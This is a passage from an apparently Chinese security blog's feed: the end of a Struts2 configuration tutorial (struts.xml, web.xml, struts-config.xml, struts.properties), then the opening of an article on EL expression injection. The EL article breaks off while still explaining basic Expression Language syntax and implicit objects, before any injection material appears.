class="string">"struts-default"</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--配置Action--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">"index"</span> <span class="attr">class</span>=<span class="string">"Xxx"</span>/&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--配置Result--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">type</span>=<span class="string">"dispatcher"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"location"</span>&gt;</span>/index.jsp<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;include&gt;元素用于包含配置 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">include</span> <span class="attr">file</span>=<span class="string">"example.xml"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在上述文件中，元素说明如下：</p><ul><li><code>&lt;struts&gt;</code> 元素是文件的根元素，所有其他元素都放在 <code>&lt;struts&gt;&lt;/struts&gt;</code> 中。</li><li><code>&lt;constant&gt;</code> 元素用于进行常量配置。</li><li><code>&lt;package&gt;</code> 元素用于进行包配置，在 Struts2 框架中，包用于组织 Action 和拦截器等信息，每个包都是由零个或多个拦截器以及 Action 所组成的集合。</li><li><code>&lt;include&gt;</code> 元素用于在一个 struts.xml 配置文件中包含其他的配置文件。</li></ul><p>下面，将分别针对这些常用的元素及其配置进行详细讲解。</p><h4 id="常量配置"><a href="#常量配置" class="headerlink" title="常量配置"></a>常量配置</h4><p>在使用 Struts2 框架开发的项目中，通常需要使用大量的常量，这些常量大多在默认的配置文件中已经配置好，但由于用户的需求不同，开发的要求也有所不同，这时可能就需要对这些常量值进行修改，其修改的方法就是在配置文件中对常量进行重新配置。</p><p>在 Struts2 中，常量的配置通常使用以下三种方式。</p><ul><li>在 struts.xml 文件中使用 <code>&lt;constant&gt;</code> 元素配置常量（常用方式）。</li><li>在 struts.properties 文件中配置常量。</li><li>在 web.xml 文件中通过 <code>&lt;init-param&gt;</code> 元素配置常量。</li></ul><p>上述三种配置方式中，在 struts.xml 文件中通过 <code>&lt;constant&gt;</code> 元素配置常量，是项目开发时最常用的方式，教程中的常量配置也是通过此种方式实现的，所以这里只介绍通过 <code>&lt;constant&gt;</code> 元素配置常量的方式，其他两种方式读者只需了解即可。</p><p>在 struts.xml 文件中通过 <code>&lt;constant.../&gt;</code> 元素配置常量时，需要指定两个必填的属性 name 和 value。其中 name 属性用于指定常量的常量名，value 属性用于指定常量的常量值。其配置的示例代码如下所示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--设置默认编码集为UTF-8--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">"struts.il8n.encoding"</span> <span class="attr">value</span>=<span class="string">"UTF-8"</span> /&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--设置使用开发模式--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">"struts.devMode"</span> <span class="attr">value</span>=<span class="string">"true"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在上述示例代码中，配置了常量 struts.i18n.encoding 和 struts.devMode。其中 struts.i18n.encoding 用于指定 Struts2 应用程序的默认编码集为 UTF-8，struts.devMode 用于指定项目使用的是开发模式。</p><p>Struts2 所支持的常量数量很多，在 struts2-core-2.3.37.jar 压缩文件的 org/apache/struts2 路径下有一个 default.properties 文件，该文件里为 Struts2 的所有常量都指定了默认值，读者可以通过查看该文件了解 Struts2 所支持的常量。</p><p>除了可以通过上述的三种方式配置常量以外，在 Struts2 内置的一些配置文件中也有对常量的配置。因此，如果在多个文件中配置了同一个 Struts2 常量，则 Struts2 框架加载常量是有一定顺序的，通常的搜索顺序如下。</p><p>1）default.properties：该文件保存在 struts2-core-2.3.37.jar 中的 org.apache.struts2 包中。</p><p>2）struts-default.xml：该文件保存在 struts2-core-2.3.37.jar 文件中。</p><p>3）struts-plugin.xml：该文件保存在 struts-Xxx-2.3.37.jar 等 Struts2 插件 JAR 包中。</p><p>4）struts.xml：该文件是 Web 应用自身的 Struts2 配置文件。</p><p>5）struts.properties：该文件是 Web 应用默认的 Struts2 配置文件。</p><p>6）web.xml：该文件是 Web 应用的配置文件。</p><p>上面指定了 Struts2 框架搜索 Struts2 常量的顺序，需要注意的是，如果在多个文件中配置了同一个 Struts2 常量，则后一个文件中配置的常量值会覆盖前面文件中配置的常量值。  </p><h4 id="包配置"><a href="#包配置" class="headerlink" title="包配置"></a>包配置</h4><p>在 Struts2 框架中，包用于管理 Action 和拦截器，每个包就是多个 Action、多个拦截器、多个拦截器引用的集合。在 struts.xml 文件中，使用 <code>&lt;package&gt;</code> 元素定义包配置，每个 <code>&lt;package&gt;</code> 元素都定义了一个包配置，其示例代码下所示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">"default"</span> <span class="attr">namespace</span>=<span class="string">"/"</span> <span class="attr">extends</span>=<span class="string">"struts-default"</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在上述代码中，<code>&lt;package&gt;</code> 元素用到了三个关键属性 name、namespace、extends，具体说明如下。</p><ul><li>name：必填属性，用于指定该包的名称（该名称在配置文件中必须是唯一的），此名称是该包被其他包引用的 Key。</li><li>namespace：可选属性，用于定义该包的命名空间。</li><li>extends：可选属性，用于指定该包继承自其他包。其属性值必须是另一个包的 name 属性值，但该属性值通常都设置为 struts-default，这样该包中的 Action 就具有了 Struts2 框架默认的拦截器等功能。</li></ul><h4 id="包含配置"><a href="#包含配置" class="headerlink" title="包含配置"></a>包含配置</h4><p>Struts2 允许将一个配置文件分解成多个配置文件，从而提高配置文件的可读性，<code>&lt;include&gt;</code> 元素用于在一个 struts.xml 配置文件中包含其他的配置文件。Struts2 默认只加载 WEB-INF/classes 下的 struts.xml 文件，一旦通过多个 XML 文件配置 Action，就必须通过 <code>&lt;include&gt;</code>元素包含其他配置文件。</p><p>在 struts.xml 文件中包含配置的示例代码如下所示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--不指定路径，默认在src下时的方式--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">include</span> <span class="attr">file</span>=<span class="string">"struts-post.xml"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">include</span> <span class="attr">file</span>=<span class="string">"struts-user.xml"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">include</span> <span class="attr">file</span>=<span class="string">"struts-dept.xml"</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--配置文件在具体包中时的方式--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">include</span> <span class="attr">file</span>=<span class="string">"com/mengma/action/struts-product.xml"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在上述代码中，struts.xml 文件通过 <code>&lt;include&gt;</code> 元素包含了四个配置文件，其中 file 属性用于指定被包含配置文件的名称。如果被包含的配置文件在 src 路径下，则直接指定文件名即可，如果被包含的配置文件在具体的包中，则需要引入被包含文件的包路径。</p><p>需要注意的是，每一个被包含的配置文件都是标准的 Struts2 配置文件，同样包含 DTD 信息、Struts2 配置文件的根元素等信息。由于 struts.xml 文件包含了其他的配置文件，所以在 Struts2 框架自动加载 struts.xml 文件时，就会完成所有配置信息的加载。</p><h3 id="web-xml"><a href="#web-xml" class="headerlink" title="web.xml"></a>web.xml</h3><p>web.xml配置文件是一种J2EE配置文件，决定Servlet容器的HTTP元素需求如何进行处理。它严格来说不是一个Struts2配置文件，但它是Struts2运作所需要进行配置的文件。</p><p>正如前面所讨论的，这个文件为每个Web应用程序提供接入点。在部署描述符（web.xml）中，Struts2应用程序的接入点将会定义为一个过滤器。因此我们将在web.xml里定义一个StrutsPrepareAndExecuteFilter类的接入点，而这个web.xml文件需要在<strong>WebContent/WEB-INF</strong>文件夹下创建。</p><p>如果你开始时没有模板或工具（比如Eclipse或Maven2）的辅助来生成，那这就是第一个你需要配置的文件。下面是我们在上一个例子中用到的web.xml的内容。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns</span>=<span class="string">"http://java.sun.com/xml/ns/javaee"</span> <span class="attr">xmlns:web</span>=<span class="string">"http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">id</span>=<span class="string">"WebApp_ID"</span> <span class="attr">version</span>=<span class="string">"3.0"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 配置Struts2核心过滤器 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span></span><br><span class="line">            org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter</span><br><span class="line">        <span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意，我们将Struts2过滤器映射到<code>/*</code>，而不是<code>/*.action</code>，这意味着所有的url都会被Struts2过滤器解析。</p><p>注意：自2.1.3版本开始，ActionContextCleanUp和FilterDispatcher都由StrutsPrepareAndExecuteFilter代替。</p><h3 id="struts-config-xml"><a href="#struts-config-xml" class="headerlink" title="struts-config.xml"></a>struts-config.xml</h3><p>struts-config.xml配置文件是Web Client中View和Model组件之间的链接，但在你99.99％的项目里你不必使用这些设置。 struts-config.xml配置文件包含以下主要元素：</p><table><thead><tr><th style="text-align:left">序号</th><th style="text-align:left">拦截器和说明</th></tr></thead><tbody><tr><td style="text-align:left">1</td><td style="text-align:left"><strong>struts-config</strong>这是配置文件的根节点。</td></tr><tr><td style="text-align:left">2</td><td style="text-align:left"><strong>form-beans</strong>这是你将ActionForm子类映射到name的位置，你可以在struts-config.xml文件的其余部分，甚至在JSP页面上，将这个name用作ActionForm的别名。</td></tr><tr><td style="text-align:left">3</td><td style="text-align:left"><strong>global forwards</strong>此部分将你在webapp上的页面映射到name，你可以使用这个name来引用实际页面。这避免了对你网页上的URL进行硬编码。</td></tr><tr><td style="text-align:left">4</td><td style="text-align:left"><strong>action-mappings</strong>这是你声明表单处理程序的地方，也被称为<strong>操作映射（action mappings）</strong>。</td></tr><tr><td style="text-align:left">5</td><td style="text-align:left"><strong>controller</strong>这部分是配置Struts的内部，在实际情况中很少使用。</td></tr><tr><td style="text-align:left">6</td><td style="text-align:left"><strong>plug-in</strong> 这部分告诉Struts在哪里找到属性文件，它包含提示和错误消息。</td></tr></tbody></table><p>下面是struts-config.xml文件的示例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="ISO-8859-1" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE struts-config PUBLIC</span></span><br><span class="line"><span class="meta">"-//Apache Software Foundation//DTD Struts Configuration 1.0//EN"</span></span><br><span class="line"><span class="meta">"http://jakarta.apache.org/struts/dtds/struts-config_1_0.dtd"&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">struts-config</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">&lt;!-- ========== Form Bean Definitions ============ --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">form-beans</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">form-bean</span> <span class="attr">name</span>=<span class="string">"login"</span> <span class="attr">type</span>=<span class="string">"test.struts.LoginForm"</span> /&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">form-beans</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">&lt;!-- ========== Global Forward Definitions ========= --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">global-forwards</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">global-forwards</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">&lt;!-- ========== Action Mapping Definitions ======== --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">action-mappings</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">action</span></span></span><br><span class="line"><span class="tag">         <span class="attr">path</span>=<span class="string">"/login"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">type</span>=<span class="string">"test.struts.LoginAction"</span> &gt;</span></span><br><span class="line"></span><br><span class="line">         <span class="tag">&lt;<span class="name">forward</span> <span class="attr">name</span>=<span class="string">"valid"</span> <span class="attr">path</span>=<span class="string">"/jsp/MainMenu.jsp"</span> /&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">forward</span> <span class="attr">name</span>=<span class="string">"invalid"</span> <span class="attr">path</span>=<span class="string">"/jsp/LoginView.jsp"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">action-mappings</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">&lt;!-- ========== Controller Definitions ======== --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">controller</span> </span></span><br><span class="line"><span class="tag">      <span class="attr">contentType</span>=<span class="string">"text/html;charset=UTF-8"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">debug</span>=<span class="string">"3"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">maxFileSize</span>=<span class="string">"1.618M"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">locale</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">nocache</span>=<span class="string">"true"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">struts-config</span>&gt;</span></span><br></pre></td></tr></table></figure><p>有关struts-config.xml文件的更多详细内容，可查看Struts Documentation。</p><h3 id="struts-properties"><a href="#struts-properties" class="headerlink" title="struts.properties"></a>struts.properties</h3><p>这个配置文件提供了一种机制来改变框架的默认行为。实际上，<strong>struts.properties</strong>配置文件中包含的所有属性也可以在<strong>web.xml</strong>中配置使用<strong>init-param</strong>，以及在<strong>struts.xml</strong>配置文件中使用<strong>constant</strong>标签。 但如果你想保持事件独立以及保留更多struts细节，那么你可以在<strong>WEB-INF/classes</strong>文件夹下创建这个文件。</p><p><strong>struts.properties</strong></p><p>文件中配置的值将覆盖。</p><p><strong>default.properties</strong></p><p>文件中配置的默认值，这些值包含在struts2-core-x.y.z.jar分布中。有一些属性，你可以考虑改为使用。</p><p><strong>struts.properties</strong></p><p>文件：</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">### When set to true, Struts will act much more friendly for developers</span></span><br><span class="line"><span class="meta">struts.devMode</span> = <span class="string">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### Enables reloading of internationalization files</span></span><br><span class="line"><span class="meta">struts.i18n.reload</span> = <span class="string">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### Enables reloading of XML configuration files</span></span><br><span class="line"><span class="meta">struts.configuration.xml.reload</span> = <span class="string">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### Sets the port that the server is run on</span></span><br><span class="line"><span class="meta">struts.url.http.port</span> = <span class="string">8080</span></span><br></pre></td></tr></table></figure><p>这里任何以<code>＃</code>开头的行都将被假定为注释，并且它会被Struts2默认忽略。</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
      <category term="Struts2" scheme="https://www.mi1k7ea.com/categories/Java/Struts2/"/>
    
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="Struts2" scheme="https://www.mi1k7ea.com/tags/Struts2/"/>
    
  </entry>
  
  <entry>
    <title>（先知首发）浅析EL表达式注入漏洞</title>
    <link href="https://www.mi1k7ea.com/2020/04/26/%E6%B5%85%E6%9E%90EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.mi1k7ea.com/2020/04/26/浅析EL表达式注入漏洞/</id>
    <published>2020-04-25T16:05:47.000Z</published>
    <updated>2020-05-10T16:01:44.614Z</updated>
    
    <content type="html"><![CDATA[<p>先知：<a href="https://xz.aliyun.com/t/7692" target="_blank" rel="noopener">https://xz.aliyun.com/t/7692</a></p><h2 id="0x01-EL简介"><a href="#0x01-EL简介" class="headerlink" title="0x01 EL简介"></a>0x01 EL简介</h2><p>EL（Expression Language） 是为了使JSP写起来更加简单。表达式语言的灵感来自于 ECMAScript 和 XPath 表达式语言，它提供了在 JSP 中简化表达式的方法，让Jsp的代码更加简化。</p><p>EL表达式主要功能如下：</p><ul><li>获取数据：EL表达式主要用于替换JSP页面中的脚本表达式，以从各种类型的Web域中检索Java对象、获取数据（某个Web域中的对象，访问JavaBean的属性、访问List集合、访问Map集合、访问数组）；</li><li>执行运算：利用EL表达式可以在JSP页面中执行一些基本的关系运算、逻辑运算和算术运算，以在JSP页面中完成一些简单的逻辑运算，例如<code>${user==null}</code>；</li><li>获取Web开发常用对象：EL表达式定义了一些隐式对象，利用这些隐式对象，Web开发人员可以很轻松获得对Web常用对象的引用，从而获得这些对象中的数据；</li><li>调用Java方法：EL表达式允许用户开发自定义EL函数，以在JSP页面中通过EL表达式调用Java类的方法；</li></ul><h2 id="0x02-基本语法"><a href="#0x02-基本语法" class="headerlink" title="0x02 基本语法"></a>0x02 基本语法</h2><h3 id="EL语法"><a href="#EL语法" class="headerlink" title="EL语法"></a>EL语法</h3><p>在JSP中访问模型对象是通过EL表达式的语法来表达。所有EL表达式的格式都是以<code>${}</code>表示。例如，<code>${ userinfo}</code>代表获取变量userinfo的值。当EL表达式中的变量不给定范围时，则默认在page范围查找，然后依次在request、session、application范围查找。也可以用范围作为前缀表示属于哪个范围的变量，例如：<code>${ pageScope. userinfo}</code>表示访问page范围中的userinfo变量。</p><p>简单地说，使用EL表达式语法：<code>${EL表达式}</code></p><p>其中，<strong>EL表达式和JSP代码等价转换</strong>。事实上，可以将EL表达式理解为一种简化的JSP代码。</p><p>扩展JSP代码的写法总结：</p><ul><li><p>JSP表达式：<code>&lt;%=变量或表达式&gt;</code></p><p>向浏览器输出变量或表达式的计算结果。</p></li><li><p>JSP脚本：<code>&lt;%Java代码%&gt;</code></p><p>执行java代码的原理：翻译到_jspService()方法中。</p></li><li><p>JSP声明：<code>&lt;%!变量或方法%&gt;</code></p><p>声明jsp的成员变量或成员方法。</p></li><li><p>JSP注释：<code>&lt;%!--JSP注释--%&gt;</code></p><p>用于注释JSP代码，不会翻译到Java文件中，也不会执行。</p></li></ul><h3 id="与-运算符"><a href="#与-运算符" class="headerlink" title="[ ]与.运算符"></a>[ ]与.运算符</h3><p>EL表达式提供<code>.</code>和<code>[]</code>两种运算符来存取数据。</p><p>当要存取的属性名称中包含一些特殊字符，如<code>.</code>或<code>-</code>等并非字母或数字的符号，就一定要使用<code>[]</code>。例如：<code>${user.My-Name}</code>应当改为<code>${user[&quot;My-Name&quot;]}</code>。</p><p>如果要动态取值时，就可以用<code>[]</code>来做，而<code>.</code>无法做到动态取值。例如：<code>${sessionScope.user[data]}</code>中data 是一个变量。</p><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>EL表达式存取变量数据的方法很简单，例如：<code>${username}</code>。它的意思是取出某一范围中名称为username的变量。因为我们并没有指定哪一个范围的username，所以它会依序从Page、Request、Session、Application范围查找。假如途中找到username，就直接回传，不再继续找下去，但是假如全部的范围都没有找到时，就回传””。EL表达式的属性如下：</p><table><thead><tr><th>属性范围在EL中的名称</th><th></th></tr></thead><tbody><tr><td>Page</td><td>PageScope</td></tr><tr><td>Request</td><td>RequestScope</td></tr><tr><td>Session</td><td>SessionScope</td></tr><tr><td>Application</td><td>ApplicationScope</td></tr></tbody></table><p>JSP表达式语言定义可在表达式中使用的以下文字：</p><table><thead><tr><th style="text-align:left">文字</th><th style="text-align:left">文字的值</th></tr></thead><tbody><tr><td style="text-align:left">Boolean</td><td style="text-align:left">true 和 false</td></tr><tr><td style="text-align:left">Integer</td><td style="text-align:left">与 Java 类似。可以包含任何整数，例如 24、-45、567</td></tr><tr><td style="text-align:left">Floating Point</td><td style="text-align:left">与 Java 类似。可以包含任何正的或负的浮点数，例如 -1.8E-45、4.567</td></tr><tr><td style="text-align:left">String</td><td style="text-align:left">任何由单引号或双引号限定的字符串。对于单引号、双引号和反斜杠，使用反斜杠字符作为转义序列。必须注意，如果在字符串两端使用双引号，则单引号不需要转义。</td></tr><tr><td style="text-align:left">Null</td><td style="text-align:left">null</td></tr></tbody></table><h3 id="操作符"><a href="#操作符" class="headerlink" title="操作符"></a>操作符</h3><p>JSP表达式语言提供以下操作符，其中大部分是Java中常用的操作符：</p><table><thead><tr><th style="text-align:left">术语</th><th style="text-align:left">定义</th></tr></thead><tbody><tr><td style="text-align:left">算术型</td><td style="text-align:left">+、-（二元）、*、/、div、%、mod、-（一元）</td></tr><tr><td style="text-align:left">逻辑型</td><td style="text-align:left">and、&amp;&amp;、or、双管道符、!、not</td></tr><tr><td style="text-align:left">关系型</td><td style="text-align:left">==、eq、!=、ne、&lt;、lt、&gt;、gt、&lt;=、le、&gt;=、ge。可以与其他值进行比较，或与布尔型、字符串型、整型或浮点型文字进行比较。</td></tr><tr><td style="text-align:left">空</td><td style="text-align:left">empty 空操作符是前缀操作，可用于确定值是否为空。</td></tr><tr><td style="text-align:left">条件型</td><td style="text-align:left">A ?B :C。根据 A 赋值的结果来赋值 B 或 C。</td></tr></tbody></table><h3 id="隐式对象"><a href="#隐式对象" class="headerlink" title="隐式对象"></a>隐式对象</h3><p>JSP表达式语言定义了一组隐式对象，其中许多对象在 JSP scriplet 和表达式中可用：</p><table><thead><tr><th>术语</th><th>定义</th></tr></thead><tbody><tr><td>pageContext</td><td>JSP页的上下文，可以用于访问 JSP 隐式对象，如请求、响应、会话、输出、servletContext 等。例如，<code>${pageContext.response}</code>为页面的响应对象赋值。</td></tr></tbody></table><p>此外，还提供几个隐式对象，允许对以下对象进行简易访问：</p><table><thead><tr><th style="text-align:left">术语</th><th style="text-align:left">定义</th></tr></thead><tbody><tr><td style="text-align:left">param</td><td style="text-align:left">将请求参数名称映射到单个字符串参数值（通过调用 ServletRequest.getParameter (String name) 获得）。getParameter (String) 方法返回带有特定名称的参数。表达式<code>${param . name}</code>相当于 request.getParameter (name)。</td></tr><tr><td style="text-align:left">paramValues</td><td style="text-align:left">将请求参数名称映射到一个数值数组（通过调用 ServletRequest.getParameter (String name) 获得）。它与 param 隐式对象非常类似，但它检索一个字符串数组而不是单个值。表达式 <code>${paramvalues. name}</code> 相当于 request.getParamterValues(name)。</td></tr><tr><td style="text-align:left">header</td><td style="text-align:left">将请求头名称映射到单个字符串头值（通过调用 ServletRequest.getHeader(String name) 获得）。表达式 <code>${header. name}</code> 相当于 request.getHeader(name)。</td></tr><tr><td style="text-align:left">headerValues</td><td style="text-align:left">将请求头名称映射到一个数值数组（通过调用 ServletRequest.getHeaders(String) 获得）。它与头隐式对象非常类似。表达式<code>${headerValues. name}</code>相当于 request.getHeaderValues(name)。</td></tr><tr><td style="text-align:left">cookie</td><td style="text-align:left">将 cookie 名称映射到单个 cookie 对象。向服务器发出的客户端请求可以获得一个或多个 cookie。表达式<code>${cookie. name .value}</code>返回带有特定名称的第一个 cookie 值。如果请求包含多个同名的 cookie，则应该使用<code>${headerValues. name}</code>表达式。</td></tr><tr><td style="text-align:left">initParam</td><td style="text-align:left">将上下文初始化参数名称映射到单个值（通过调用 ServletContext.getInitparameter(String name) 获得）。</td></tr></tbody></table><p>除了上述两种类型的隐式对象之外，还有些对象允许访问多种范围的变量，如 Web 上下文、会话、请求、页面：</p><table><thead><tr><th style="text-align:left">术语</th><th style="text-align:left">定义</th></tr></thead><tbody><tr><td style="text-align:left">pageScope</td><td style="text-align:left">将页面范围的变量名称映射到其值。例如，EL 表达式可以使用<code>${pageScope.objectName}</code>访问一个 JSP 中页面范围的对象，还可以使用<code>${pageScope .objectName. attributeName}</code>访问对象的属性。</td></tr><tr><td style="text-align:left">requestScope</td><td style="text-align:left">将请求范围的变量名称映射到其值。该对象允许访问请求对象的属性。例如，EL 表达式可以使用<code>${requestScope. objectName}</code>访问一个 JSP 请求范围的对象，还可以使用<code>${requestScope. objectName. attributeName}</code>访问对象的属性。</td></tr><tr><td style="text-align:left">sessionScope</td><td style="text-align:left">将会话范围的变量名称映射到其值。该对象允许访问会话对象的属性。例如：<code>${sessionScope. name}</code></td></tr><tr><td style="text-align:left">applicationScope</td><td style="text-align:left">将应用程序范围的变量名称映射到其值。该隐式对象允许访问应用程序范围的对象。</td></tr></tbody></table><h4 id="pageContext对象"><a href="#pageContext对象" class="headerlink" title="pageContext对象"></a>pageContext对象</h4><p>pageContext对象是JSP中pageContext对象的引用。通过pageContext对象，您可以访问request对象。比如，访问request对象传入的查询字符串，就像这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;pageContext.request.queryString&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/26/浅析EL表达式注入漏洞/1.png" alt=""></p><h4 id="Scope对象"><a href="#Scope对象" class="headerlink" title="Scope对象"></a>Scope对象</h4><p>pageScope，requestScope，sessionScope，applicationScope变量用来访问存储在各个作用域层次的变量。</p><p>举例来说，如果您需要显式访问在applicationScope层的box变量，可以这样来访问：applicationScope.box。</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 